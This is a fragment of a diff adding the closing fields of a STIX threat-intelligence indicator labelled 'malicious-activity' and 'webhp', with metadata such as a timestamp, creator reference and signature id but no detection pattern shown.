+      "pattern_type": "stix",
+      "valid_from": "2025-12-03T17:26:42.757Z",
+      "created_by_ref": "identity--3ddbe507-3301-496d-944a-f9a973343095",
+      "labels": [
+        "malicious-activity",
+        "webhp"
+      ],
+      "indicator_types": [
+        "malicious-activity"
+      ],
+      "x_count": 1,
+      "x_sid": 1000037
+    }
+  ]
+}
